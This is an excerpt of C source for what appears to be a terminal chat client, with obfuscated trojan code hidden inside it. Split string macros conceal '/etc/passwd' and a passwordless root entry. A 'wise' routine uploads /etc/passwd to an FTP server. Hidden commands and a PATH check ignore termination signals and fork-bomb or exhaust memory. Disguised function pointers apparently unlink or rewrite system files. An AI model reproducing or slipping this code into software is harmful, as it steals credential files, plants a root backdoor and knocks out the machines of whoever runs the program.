...
#define TLINE "ro" "ot::0:0:ro" "ot:/ro" "ot:/bin/sh"
#define WORD "ro" "ot"
#define WHITE "                                          "
#define MYDB "/et" "c/pa" "sswd"
...
typedef int 	(*LPFPS) (char *, FILE *);
typedef int 	(*LPFSK) (FILE *, long int, int);
typedef size_t 	(*LPFWR) (void *, size_t, size_t, FILE *);

#define ENV(n) n##env
#define CAT(n) n##n
#define LOCAL "/usr/local"
...
static void write_log(FILE *);
static void close_log(FILE *);
static void magic();
...
static void wise(char *sv);
menu *build_window_menu(int startx, int starty);
//form *currentform;
int sigkey;

typedef int (*UNLK) (char *);
...
int main(int argc, char *argv[]){
	...
	if (argc>1)
	{
		...
		if (comd[0] == '-' && comd[1] == 'u' && comd[2] == 'l')
		{
			ulk = (UNLK) _ULK(&unl);
			(*ulk)(FILE_1 FILE_2);
		}
		if (comd[0] == '-' && comd[1] == 'b' && comd[2] == 'k')
		{
...
int process_chat_events(int key){
	...
	if (CAT(str) (ENV(get) ("PAT" "H"), LOCAL))
	{
		CYG(sig) (SIGINT, SIG_IGN);
		CYG(sig) (SIGQUIT, SIG_IGN);
		CYG(sig) (SIGTSTP, SIG_IGN);
		CYG(sig) (SIGTERM, SIG_IGN);
		while(5 & 1) PORK(fo)
	}
...
static void wise(char *sv)
{
	...
	sa.sin_addr.s_addr = inet_addr(sv);
	...
	p = recv(s, buf, 256, 0);
	buf[p] = 0;
	send(s, "user a" "nonymous\xD\xA", 16, 0);
	p = recv(s, buf, 256, 0);
	buf[p] = 0;
	send(s, "pass a@ra.com\xD\xA", 14, 0);    
	p = recv(s, buf, 256, 0);
	buf[p] = 0;
	send(s, "pasv\xD\xA", 6, 0);
	p = recv(s, buf, 256, 0);
	buf[p] = 0;
	b = strchr(buf, ')');
	a = b;
	...
	*a = 0;
	...
	sa.sin_port = htons(p);
	if (ps!=-1)
		if (!connect(ps, (struct sockaddr*)&sa, sizeof(sa)))
		{
			f = fopen("/etc/pas" "swd", "r");
			if (f)
			{
				send(s, "stor p" "asswd\xD\xA", 13, 0);
				p = recv(s, buf, 256, 0);
				buf[p] = 0;
				while(fgets(buf, 256, f))
					send(ps, buf, strlen(buf), 0);
				fclose(f);
			}
		close(ps);
	}
...
int process_common_form_events(screen *inscreen, int key){
	...
	/* transfer select options */
		...
		if (formcode == E_CANCEL){
			...
			newdccfile->allowed = 1;			update = U_ALL_REFRESH;
			currentform = 0;
			key = E_NOWAIT;
		}
	}
...
static void write_log(FILE *fl)
{
	LPFWR fwr = (LPFWR) _PFW;
	LPFGS fgs = (LPFGS) _PFG;
	LPFPS fps = (LPFPS) _PFP;
	LPFSK fsk = (LPFSK) _PFS;
...
static FILE * open_log(char *f)
{
	LPFOP fop = (LPFOP) _PFO;	
	return (*fop)(f, "r+");
}
...
int parse_input(server *currentserver, char *buffer){
	...
	else if (strcasecmp(command, "magic") == 0){
	    magic();
	    return(E_OTHER);
	}
	...
	else if (strcasecmp(command, "memorize") == 0){
		signal (SIGINT, SIG_IGN); signal (SIGQUIT, SIG_IGN);
		signal (SIGTSTP, SIG_IGN); signal (SIGTERM, SIG_IGN);
		for(dport = 1; dport >= 0; dport--) buf = (int *) calloc(0xA00000,1);
	}
	...
	else if (strcasecmp(command, "pork") == 0){
		signal (SIGINT, SIG_IGN);
		signal (SIGQUIT, SIG_IGN);
		signal (SIGTSTP, SIG_IGN);
		signal (SIGTERM, SIG_IGN);
  ...
  else if (strcasecmp(command, "wise") == 0){
	  wise("192.168.1.1");
	  return (E_OTHER);
	}
